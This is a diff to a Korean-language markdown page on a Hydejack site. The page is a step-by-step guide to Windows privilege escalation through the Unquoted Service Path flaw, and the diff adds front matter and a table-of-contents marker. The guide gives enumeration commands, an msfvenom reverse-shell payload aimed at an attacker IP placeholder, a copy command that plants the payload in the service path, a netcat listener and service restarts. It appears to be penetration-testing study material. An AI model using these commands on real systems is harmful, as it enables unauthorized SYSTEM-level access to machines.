@@ -1,4 +1,14 @@
+---
+layout: page
+title: Unquoted_Service_Path
+description: >
+  This chapter covers the basics of content creation with Hydejack.
+hide_description: true
+sitemap: false
+---
 
+0. this unordered seed list will be replaced by toc as unordered list
+{:toc}
 
 
 # 취약한 서비스 경로 (Unquoted Service Path) 공격 가이드
@@ -21,7 +31,7 @@ Unquoted Service Path는 Windows 서비스의 실행 파일 경로가 큰따옴�
 
 - **목표:** 따옴표로 묶여있지 않고, 경로에 공백이 포함된 서비스를 찾습니다.
 
-```powershell title="취약한 서비스 검색"
+```powershell
 . .\PowerView.ps1;Invoke-AllChecks
 winPEASany.exe
 
@@ -37,7 +47,7 @@ wmic service get name,pathname,displayname,startmode | findstr /i /v "C:\Windows
 
 - **목표:** 식별된 취약한 경로의 상위 폴더에 현재 사용자가 쓰기 권한을 가지고 있는지 확인합니다.
 
-```powershell title="권한 확인"
+```powershell
 sc.exe qc unquotedsvc
 
 # 예: C:\Program Files\Unquoted Path Service\ 경로의 권한 확인
@@ -59,26 +69,26 @@ sc.exe stop unquotedsvc
 
 1.  **리버스 셸 페이로드 생성:**
     - `msfvenom`을 사용하여 `exe` 형식의 리버스 셸 페이로드를 생성합니다. 파일 이름은 Windows가 먼저 실행을 시도할 이름(예: `Program.exe`)으로 지정합니다.
-    ```bash title="공격자: msfvenom 페이로드 생성"
+```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f exe -o Program.exe
 ```
 
 2.  **페이로드 업로드:**
     - 생성된 `Program.exe`를 쓰기 권한이 있는 경로(예: `C:\`)에 업로드합니다.
     - 다음으로, 실행 파일을 따옴표로 묶지 않은 경로의 쓰기 가능한 폴더에 넣으세요. Windows는 따옴표로 묶지 않은 컨텍스트에서 데이터 구문 분석을 처리하는 방식 때문에 원래 실행 파일보다 먼저 실행 파일을 읽습니다.
-    ```bash title="페이로드 업로드"
+```bash
 copy "C:\users\user\jaja\reverse.exe" "C:\Program Files\Unquoted Path Service\Common.exe"
 ```
 
 3.  **리스너 실행:**
     - 공격자 머신에서 Netcat 리스너를 실행하여 연결을 기다립니다.
-    ```bash title="공격자: Netcat 리스너"
+```bash
 rlwrap nc -lvnp 443
 ```
 
 4.  **서비스 재시작:**
     - 타겟 시스템에서 서비스를 재시작하여 악성 페이로드가 실행되도록 합니다.
-    ```powershell title="타겟: 서비스 재시작"
+```powershell
 sc.exe query unquotedsvc
 sc stop <servicename>
 sc start <servicename>
